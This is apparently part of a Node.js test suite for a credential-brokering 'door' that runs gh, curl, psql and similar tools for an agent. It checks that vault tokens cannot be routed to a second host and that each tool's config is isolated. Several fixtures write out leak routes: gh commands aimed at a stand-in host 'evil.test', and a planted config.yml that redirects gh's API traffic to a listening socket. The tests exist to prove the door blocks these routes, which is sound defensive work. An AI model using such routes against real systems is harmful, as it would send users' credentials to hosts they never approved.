    ok(E2.VS_SUITE_CALLER_MARK === 'the-caller-env', 'RED control: a door built on the caller\'s env (process.env spread) hands the run the caller\'s mark — the suite\'s own environment is what keeps its verdicts the same everywhere', { mark: E2.VS_SUITE_CALLER_MARK }); }
  // …and through world()'s OWN default agent env (the one every ①–⑪ door uses — no agentEnv given): the mark is absent there too,
  // HOME the stand-in (the read: the printer door above builds its env inline, so that check alone holds by construction)
  { const P3 = capOf();
    const plainDoor = sw.mk(DOOR, { spawnImpl: P3.spawn });
    await plainDoor.run({ caller: sw.caller, args: ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'ran', path.join(sw.work, 'x3.txt')], cwd: sw.work });
    const E3 = P3.get() ? P3.get().env : {};
    ok(!!P3.get() && E3.VS_SUITE_CALLER_MARK === undefined && E3.HOME === SUITE_HOME, '主开发 00:56Z: world()\'s own default door spawns a run on the SUITE\'s environment — the caller\'s mark absent, HOME the stand-in', { spawned: !!P3.get(), mark: E3.VS_SUITE_CALLER_MARK, home: E3.HOME }); }
  // GUARDED real-gh WIRE leg (minor 4): run the REAL pinned gh through the door (DEFAULT toolDigest = the streaming sha256, REAL
  // ownership) against a planted config.yml whose http_unix_socket points at a live unix socket I listen on — the socket must get
  // ZERO bytes (the seal, GH_CONFIG_DIR=NOWHERE, means no planted config is read), and the real binary RAN (its bytes match the pin).
  const REALGH = '/var/tmp/vibespace-lanes/vault-agent-own/bin/gh';
  if (!fs.existsSync(REALGH)) {
    console.log('  – ⑫ real-gh WIRE leg SKIPPED: the pinned gh is not at ' + REALGH + ' (the digest + wire property are proven in the report’s scratch harness)');
  } else {
    const net = require('node:net');
    const sockPath = path.join(sw.dir, 'evil.sock');
    let hits = 0, got = 0;
    const server = net.createServer((c) => { hits++; c.on('data', (d) => { got += d.length; }); c.on('error', () => {}); });
    await new Promise((res) => server.listen(sockPath, res));
    try {
      const pdir = path.join(sw.dir, 'planted-gh'); fs.mkdirSync(pdir, { recursive: true });
      fs.writeFileSync(path.join(pdir, 'config.yml'), `http_unix_socket: ${sockPath}\n`);   // if gh read this planted config, its API call would dial my socket — the seal (GH_CONFIG_DIR=NOWHERE) means it never does
      const dW = sw.mk(DOOR, { isRootOwned: REAL, toolSealed: (p, fd) => p === REALGH || DOOR.sealedToolReal(p, fd), agentEnv: () => ({ ...SUITE_ENV, HOME: pdir, GH_CONFIG_DIR: pdir, HTTPS_PROXY: 'http://127.0.0.1:1', HTTP_PROXY: 'http://127.0.0.1:1', PATH: [path.dirname(REALGH), '/usr/bin', '/bin'].join(':') }) });   // round 14: model the lane's pinned gh as root-owned (a test cannot chown it); the REAL streaming sha256 still verifies its bytes
      const rW = await dW.run({ caller: sw.caller, args: ['--timeout', '15', '--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', REALGH, 'pr', 'create', '-R', 'o/r', '--head', 'feat', '-t', 't', '-b', 'b'], cwd: sw.work });
      await sleep(150);
      ok(hits === 0 && got === 0, 'round 12 (minor 4, WIRE): the REAL pinned gh, run through the door with a planted config.yml (http_unix_socket → my live socket), connected to the socket ZERO times and sent ZERO bytes — the seal (GH_CONFIG_DIR=NOWHERE) means no planted config / hosts is read; the token never reached the agent socket', { hits, bytes: got, exit: rW.exit, stderr: (rW.stderr || '').slice(0, 90) });
      ok(rW.ok === true && rW.by === 'own', 'round 12/14/15 (minor 4): the REAL pinned gh is SEALED (root-owned) and its live bytes are DRIFT-RECORDED (never gated), and it RAN ok:own — the streaming sha256 the door computes on the live binary is the drift record, exec\'d as the SAME inode via /proc/fd', { ok: rW.ok, by: rW.by, exit: rW.exit });
    } finally { server.close(); try { fs.unlinkSync(sockPath); } catch { } }
  }

  // ── ROUND 16 ITEM 1 (BLOCKER): a <url> POSITIONAL whose host differs from -R / GH_HOST is TWO route hosts ⇒ two_hosts ──
  // base (6df327c0): urlArg did not exist, so the URL host was DROPPED from routeHosts; the verdict saw only the -R host, approved
  // ok:own with NO card, and the seal homed GH_ENTERPRISE_TOKEN to the -R host while gh CONTACTED the URL's host (evil.test) — the
  // leak, proven end-to-end by the report's dead-proxy GH_DEBUG=api trace (Host: evil.test, Authorization: token ████).
  {
    const EVIL = { 'issue view': 'https://evil.test/o/r/issues/1', 'pr view': 'https://evil.test/o/r/pull/2', 'issue comment': 'https://evil.test/o/r/issues/1', 'issue close': 'https://evil.test/o/r/issues/1', 'pr checks': 'https://evil.test/o/r/pull/2' };
    const bad = [];
    for (const [verb, url] of Object.entries(EVIL)) {
      const cap = capOf();
      const dV = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
      const extra = verb === 'issue comment' ? ['--body', 'x'] : [];
      const r = await dV.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, ...verb.split(' '), url, '-R', 'ghe.example.test/o/r', ...extra], cwd: sw.work });
      if (!(r.code === 'two_hosts' && !cap.get() && Array.isArray(r.hosts) && r.hosts.includes('evil.test') && r.hosts.includes('ghe.example.test') && /evil\.test/.test(r.words || '') && /ghe\.example\.test/.test(r.words || ''))) bad.push([verb, r.code, !!cap.get(), r.hosts]);
    }
    ok(!bad.length, `round 16 (BLOCKER): each URL-positional gh verb (${Object.keys(EVIL).join(', ')}) with a <url> host != the -R host ⇒ two_hosts BY NAME, naming BOTH hosts, nothing spawned — base dropped the URL host, approved ok:own, and homed GH_ENTERPRISE_TOKEN to the URL's host`, bad);
    // round 19 (item 1 BLOCKER): a <url>/<endpoint> the WHATWG parser REJECTS (port > 65535, a numeric last label) ⇒ bad_host BY NAME, nothing spawned — daade1a7 DROPPED the rejected host from routeHosts, approved ok:own with GH_HOST=ghe + GH_ENTERPRISE_TOKEN, and gh drops the bad port / dials the name (the dead-proxy trace: Host: evil.test, Authorization: token). The commit's own «a string the parser rejects ⇒ bad_host» contract, now implemented at the door.
    { const REJ = [['issue view', 'https://evil.test:99999/o/r/issues/1', ['-R', 'ghe.example.test/o/r']], ['pr view', 'https://evil.test:65536/o/r/pull/2', ['-R', 'ghe.example.test/o/r']], ['api', 'https://evil.test:99999/x', ['--hostname', 'ghe.example.test']], ['issue view', 'https://evil.test.123/o/r/issues/1', []]];
      const rbad = [];
      for (const [verb, url, extra] of REJ) { const cap = capOf(); const dR = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
        const r = await dR.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, ...verb.split(' '), url, ...extra], cwd: sw.work });
        if (!(r.code === 'bad_host' && !cap.get())) rbad.push([verb, url, r.code, !!cap.get()]); }
      ok(!rbad.length, 'round 19 (item 1 BLOCKER): a gh <url>/<endpoint> the WHATWG parser rejects (port > 65535, numeric last label) ⇒ bad_host BY NAME, nothing spawned — daade1a7 dropped the host and approved ok:own + GH_ENTERPRISE_TOKEN to the -R host while gh dials the rejected host', rbad); }
    // no FALSE two_hosts: a <url> whose host EQUALS the -R host (one route), and a number positional, both run ok:own
    const c1 = capOf(), c2 = capOf();
    const d1 = mkGh({ spawnImpl: c1.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const r1 = await d1.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'view', 'https://ghe.example.test/o/r/issues/1', '-R', 'ghe.example.test/o/r'], cwd: sw.work });
    const d2 = mkGh({ spawnImpl: c2.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const r2 = await d2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'view', '123', '-R', 'ghe.example.test/o/r'], cwd: sw.work });
    const E1 = c1.get() ? c1.get().env : {}, E2 = c2.get() ? c2.get().env : {};
    ok(r1.ok && r1.by === 'own' && E1.GH_HOST === 'ghe.example.test' && !!E1.GH_ENTERPRISE_TOKEN && !E1.GH_TOKEN && r2.ok && r2.by === 'own' && E2.GH_HOST === 'ghe.example.test', 'round 16: NO false two_hosts — a <url> whose host EQUALS the -R host (one route), and a number positional + -R, both run ok:own with GH_HOST pinned to the ghe host + GH_ENTERPRISE_TOKEN homed', { r1: r1.code || r1.by, GH_HOST1: E1.GH_HOST, cred1: E1.GH_ENTERPRISE_TOKEN ? 'ENTERPRISE' : (E1.GH_TOKEN ? 'GH_TOKEN' : '-'), r2: r2.code || r2.by });
  }

  // ── ROUND 16 ITEM 2 (MAJOR): a no-row tool (a shell) names its host on the card, never «unknown» ──
  {
    const cap = capOf();
    const dSh = sw.mk(DOOR, { isRootOwned: REAL, spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: ['/usr/bin', '/bin'].join(':') }) });
    const p = dSh.run({ caller: sw.caller, args: ['--env', 'T=vault://agent:conv-1/site-pw', '--', 'bash', '-c', 'curl https://x.example'], cwd: sw.work });
    const c = await waitCard(sw); const d = c ? c.detail : '';
    if (c) dSh.answer(c.action.askId, { answer: 'deny' });
    await p.catch(() => {});
    const hostsLine = (d.match(/^Hosts: (.+)$/m) || [])[1] || '(no card)';
    ok(!!c && /x\.example/.test(hostsLine) && !/unknown/.test(hostsLine), 'round 16 (MAJOR): bash -c "curl https://x.example" under a minted value — the card names x.example on the Hosts line (base said «unknown — the tool names none»: routeHosts was empty for a no-row tool)', { hostsLine });
  }

  // ── ROUND 16 MINOR #1: a routing host that does not parse ⇒ bad_host, never «null» at the verdict ──
  {
    const PSQLDIR = path.join(ROOT, 'psqlbin'); fs.mkdirSync(PSQLDIR, { recursive: true });
    fs.writeFileSync(path.join(PSQLDIR, 'psql'), '#!/bin/sh\necho psql\n', { mode: 0o755 });
    const cap = capOf();
    const dP = sw.mk(DOOR, { isRootOwned: REAL, spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [PSQLDIR, '/usr/bin', '/bin'].join(':') }) });
    const r = await dP.run({ caller: sw.caller, args: ['--env', 'PGPASSWORD=vault://agent:conv-1/site-pw', '--', 'psql', '-h', ',db.example.com'], cwd: sw.work });
    ok(r.code === 'bad_host' && !cap.get() && !cardsOf(sw).length, 'round 16 (MINOR): psql -h ,db.example.com (a host-list element that does not parse ⇒ null) ⇒ bad_host BY NAME, no card, nothing ran — base let a null host reach the verdict («sends it to null»)', { code: r.code, spawned: !!cap.get() });
  }

  // ── ROUND 16 MINOR #2: a MALFORMED drift record is discarded + rewritten — the sealed gh still RUNS (never fails forever) ──
  {
    const toolsFile = path.join(sw.dataDir, 'vault-run-tools.json');
    fs.writeFileSync(toolsFile, JSON.stringify({ v: 1, tools: { [GHREAL_GH]: { sha256: 123 } } }));   // a number sha256: base's driftNote did prev.sha256.slice and THREW, failing EVERY sealed gh run and never healing
    const cap = capOf();
    const dM = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    let threw = null, r = null;
    try { r = await dM.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work }); } catch (e) { threw = (e && e.message) || String(e); }
    const rec = JSON.parse(fs.readFileSync(toolsFile, 'utf8')).tools[GHREAL_GH];
    ok(!threw && r && r.ok && r.by === 'own' && !!cap.get() && rec && typeof rec.sha256 === 'string', 'round 16 (MINOR): a MALFORMED drift record (sha256 is a number) is DISCARDED and rewritten as a fresh baseline — the sealed gh RUNS ok:own (base THREW on prev.sha256.slice, failing every sealed gh run and never healing)', { threw, ok: r && r.ok, recSha: rec && typeof rec.sha256 });
  }

  // ── ROUND 16 MINOR #3: the post-verdict tool_not_sealed (ownership moved between the hash and the spawn) RESTORES the once-grant ──
  {
    const w3 = await world({ instance: 'local' });
    let seals = 0;
    const statefulSeal = (p, fd) => { if (p !== GHREAL_GH) return DOOR.sealedToolReal(p, fd); seals++; return seals === 1; };   // SEALED at the in-block hash, UNSEALED at the pre-spawn re-check (ownership changed between them)
    const cap = capOf();
    const d3 = w3.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: statefulSeal, spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const q3 = d3.request({ caller: w3.caller, entry: 'vault://mounts/m1/secretKey', purpose: 'drift re-check' });
    d3.answerRequest(q3.askId, { answer: 'once', reauthed: true });
    const before = d3._grants.size;
    const pr3 = d3.run({ caller: w3.caller, args: ['--env', 'GH_TOKEN=vault://mounts/m1/secretKey', '--', GHREAL_GH, 'issue', 'list'], cwd: w3.work });
    const c3 = await waitCard(w3, 800); if (c3) d3.answer(c3.action.askId, { answer: 'once' });   // a host pass may be asked; answering it does not touch the pre-created m1 once-grant (admitted before the ask)
    const r3 = await pr3;
    ok(before === 1 && r3.code === 'tool_not_sealed' && /ownership changed between/.test(r3.words || '') && !cap.get() && d3._grants.size === 1, 'round 16 (MINOR): a tool whose ownership changes between the hash and the spawn ⇒ tool_not_sealed AFTER the spend RESTORES the once-grant (nothing ran) and the words name THIS path (not the directory-writable remedy) — base lost the grant with nothing run', { code: r3.code, grantsBefore: before, grantsAfter: d3._grants.size, words: (r3.words || '').slice(0, 56) });
  }

  // ── ROUND 16 MINOR #4: a plain gh card never «mentions» the row default (api.github.com) ──
  {
    const cap = capOf();
    const dM4 = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...SUITE_ENV, HOME: SUITE_HOME, PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
    const p = dM4.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
    const c = await waitCard(sw); const d = c ? c.detail : '';
    if (c) dM4.answer(c.action.askId, { answer: 'deny' });
    await p.catch(() => {});
    ok(!!c && /^Hosts: github\.com$/m.test(d) && !/Mentions/.test(d), 'round 16 (MINOR): a plain gh card (a GHES-minted value routed to github.com) names Hosts: github.com and shows NO Mentions line — base leaked the row default api.github.com into «Mentions» (a row default is a route host, never a mention)', { hosts: (d.match(/^Hosts: .+$/m) || [])[0], mentions: (d.match(/^Mentions.+$/m) || [])[0] || 'none' });
  }

  // ── ⑬ THE HOME CENSUS (B-f1d3, lane lg-vault-env): EVERY KNOWN_TOOLS row driven through the REAL door ──
  // Each row's fake tool (never executed: a capturing spawn) runs with a stored own value; the hub's env carries every pin's
  // variable pointed at a PLANTED dir (the inherited road) and a lower-case npm_config_userconfig (a hub started by npm). The
  // child's env and argv are then read against the row's census entry. What is still OPEN is pinned BY ROW (RED_LIST: how many
  // of its pins the child misses) — it only shrinks: a unit that seals a row takes it off, a new gap is red by name.
  {
    const CB = path.join(ROOT, 'census-bin'); fs.mkdirSync(CB, { recursive: true });
    const PLANT = path.join(ROOT, 'planted-home'); fs.mkdirSync(PLANT, { recursive: true });
    const ARGS = { curl: ['https://api.example.com/x'], wget: ['https://api.example.com/x'], http: ['https://api.example.com/x'], gh: ['issue', 'list'], git: ['ls-remote', 'https://api.example.com/r.git'], aws: ['s3', 'ls'], gcloud: ['compute', 'instances', 'list'], az: ['group', 'list'], npm: ['view', 'left-pad'], pip: ['download', 'left-pad'], docker: ['pull', 'alpine'], kubectl: ['get', 'pods', '-s', 'https://api.example.com'], psql: ['-h', 'api.example.com'], mysql: ['-h', 'api.example.com'], rclone: ['lsd', 'remote:'], ssh: ['api.example.com', 'true'], sftp: ['api.example.com'], scp: ['f.txt', 'api.example.com:/x'], rsync: ['f.txt', 'api.example.com:/x'] };
    const pinNames = [...new Set(Object.values(VR.TOOL_HOME_SEAL).flatMap((e) => Object.keys(e.env)))];
    const pinLower = new Set(pinNames.map((k) => k.toLowerCase()));
    const quiet = Object.fromEntries(Object.entries(SUITE_ENV).filter(([k]) => !pinLower.has(k.toLowerCase()) && !/^npm_config_/i.test(k)));   // the runner's own npm_config_* never reach the count
    const hubEnv = () => ({ ...quiet, HOME: SUITE_HOME, ...Object.fromEntries(pinNames.map((k) => [k, PLANT])), npm_config_userconfig: path.join(PLANT, '.npmrc'), PATH: [CB, GHREAL, '/usr/bin', '/bin'].join(':') });
    const tokenOk = (v, got) => {
      if (v === '<ssh>') return typeof got === 'string' && /^'?\/[^ ']+\/ssh'? -F \/dev\/null$/.test(got);
      const t = /^<(nowhere|fresh)>(.*)$/.exec(v);
      if (!t) return got === v;
      if (typeof got !== 'string') return false;
      return t[1] === 'nowhere' ? got === NOWHERE + t[2] : (got.startsWith(sw.runRoot + path.sep) && got.endsWith(t[2]) && !fs.existsSync(got));   // a fresh dir lives in THIS run's folder and is gone with it
    };
    // the SIXTH term (the U1 cure): the child's search path must be the door's sealed PATH — the root-owned realpaths of the
    // hub's PATH (the census bin and ghreal are uid-owned, so it is /usr/bin here); a tool starts programs BY NAME through it
    const SEALED_PATH = [...new Set(hubEnv().PATH.split(':').map((x) => DOOR.sealDirReal(x)).filter(Boolean))].join(':');
    const SEALED_ROOT_ONLY = SEALED_PATH.length > 0 && SEALED_PATH.split(':').every((x) => x !== CB && x !== GHREAL && DOOR.rootOwnedNoWrite(x));   // the yardstick itself is proven root-only (never the census bin, never ghreal)
    const missingOf = (name, E, A) => {
      const e = VR.TOOL_HOME_SEAL[name], out = [];
      for (const k of VR.SEAL_HOME_ENV) if (E[k] !== NOWHERE) out.push(k);
      if (E[VR.SEAL_PATH_ENV] !== SEALED_PATH) out.push(VR.SEAL_PATH_ENV);
      for (const [k, v] of Object.entries(e.env)) { if (!tokenOk(v, E[k])) out.push(k); for (const x of Object.keys(E)) if (x !== k && x.toLowerCase() === k.toLowerCase()) out.push(x + ' (a case variant)'); }
      if (e.argv.length && JSON.stringify(A.slice(0, e.argv.length)) !== JSON.stringify(e.argv)) out.push('argv ' + e.argv.join(' '));
      return out;
    };
    const measured = {}, why = {};
    for (const row of VR.KNOWN_TOOLS) {
      if (!VR.TOOL_HOME_SEAL[row.name] || !ARGS[row.name]) { measured[row.name] = -1; why[row.name] = !VR.TOOL_HOME_SEAL[row.name] ? 'no census entry (src/vault-run.js TOOL_HOME_SEAL)' : 'no census command (this leg\'s ARGS)'; continue; }   // a NEW row fails BY NAME, never a TypeError
      let cap = null;
      const spawn = (cmd, args, opts) => { cap = { cmd, args, env: opts.env }; const c = new EventEmitter(); c.pid = 99013; c.stdout = new EventEmitter(); c.stdout.destroy = () => {}; c.stderr = new EventEmitter(); c.stderr.destroy = () => {}; c.stdin = null; setImmediate(() => { c.emit('exit', 0, null); c.emit('close', 0, null); }); return c; };
      const isGh = row.name === 'gh';
      const tool = isGh ? GHREAL_GH : path.join(CB, row.name);
      if (!isGh) fs.writeFileSync(tool, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
      const d = isGh ? mkGh({ spawnImpl: spawn, agentEnv: hubEnv }) : sw.mk(DOOR, { isRootOwned: (p) => p === CB || p.startsWith(CB + path.sep) || REAL(p), spawnImpl: spawn, agentEnv: hubEnv });   // each fake models a ROOT-OWNED install (a test cannot chown): the census measures the sealed case, never a programWritable one
      const { r } = await runAnswered(sw, ['--env', (isGh ? 'GH_TOKEN' : 'SECRET_T') + '=vault://agent:conv-1/gh-token', '--', tool, ...ARGS[row.name]], { door: d });
      if (!cap) { measured[row.name] = -1; why[row.name] = (r && (r.code || r.words)) || 'not spawned'; continue; }
      const miss = missingOf(row.name, cap.env || {}, cap.args || []);
      measured[row.name] = miss.length; if (miss.length) why[row.name] = miss;
      console.log(`    census ${row.name}: ${miss.length ? 'OPEN — ' + miss.join(', ') : 'sealed'}`);
    }
    ok(Object.values(measured).every((n) => n >= 0), 'B-f1d3: every KNOWN_TOOLS row has its census entry and command and reached the spawn through the door (none refused before it — the census reads a real child env); a NEW row is named here', Object.fromEntries(Object.entries(why).filter(([k]) => measured[k] < 0)));
    // THE RED LIST — the rows still OPEN and how many of their pins the child misses (HOME + 4 XDG + PATH + the row's env pins + a
    // case variant left beside one + the argv word). gh's 1 is its git child's ssh (GIT_SSH_COMMAND): its runSeal is the only seal today.
    const RED_LIST = { curl: 8, wget: 8, http: 8, gh: 1, git: 9, aws: 9, gcloud: 8, az: 9, npm: 10, pip: 8, docker: 7, kubectl: 8, psql: 9, mysql: 9, rclone: 7, ssh: 7, sftp: 7, scp: 7, rsync: 7 };
    const open = Object.fromEntries(Object.entries(measured).filter(([, n]) => n !== 0).sort(([a], [b]) => (a < b ? -1 : 1)));
    const want = Object.fromEntries(Object.entries(RED_LIST).sort(([a], [b]) => (a < b ? -1 : 1)));
    ok(JSON.stringify(open) === JSON.stringify(want), `B-f1d3 THE HOME CENSUS (a ratchet): the rows still OPEN and the pins each child misses equal the pinned red list (${Object.keys(want).length} rows open of ${VR.KNOWN_TOOLS.length})`, { measured: open, why });
    const pathOpen = VR.KNOWN_TOOLS.filter((r) => (why[r.name] || []).includes('PATH')).map((r) => r.name);
    ok(SEALED_ROOT_ONLY && JSON.stringify(pathOpen) === JSON.stringify(VR.KNOWN_TOOLS.map((r) => r.name).filter((n) => n !== 'gh')),
      'B-f1d3 (the U1 cure) PATH IS A TERM FOR EVERY ROW: the 18 rows without a seal hand the child the hub\'s PATH (its uid-owned census bin first) — open; gh\'s seal hands the sealed PATH — present (the red control: a census of five homes would count neither)', { SEALED_PATH, pathOpen });
    ok(JSON.stringify(why.gh) === '["GIT_SSH_COMMAND"]' && why.git && why.git.includes('GIT_CONFIG_GLOBAL') && why.npm && why.npm.includes('npm_config_userconfig (a case variant)'),
      'B-f1d3: the census READS the child — gh\'s sealed pins (HOME, XDG_*, PATH, GH_CONFIG_DIR, its git child\'s config) measure as present and only its ssh child is open; git\'s same pin is open; the hub\'s lower-case npm variable is seen', { gh: why.gh, git: why.git, npm: why.npm });
  }
}
try { fs.chmodSync(BIN, 0o755); } catch { }   // the read-only bin given back (the scratch dir is removed)
try { fs.chmodSync(GHBIN, 0o755); } catch { }   // B-f1d3: GHBIN too — left 0555 its gh could not be unlinked and the scratch dir outlived the suite (the test machine's LEFTOVERS)
console.log(`\n${fail ? fail + ' FAILED' : 'ALL PASS'} (${pass})`);
process.exit(fail ? 1 : 0);
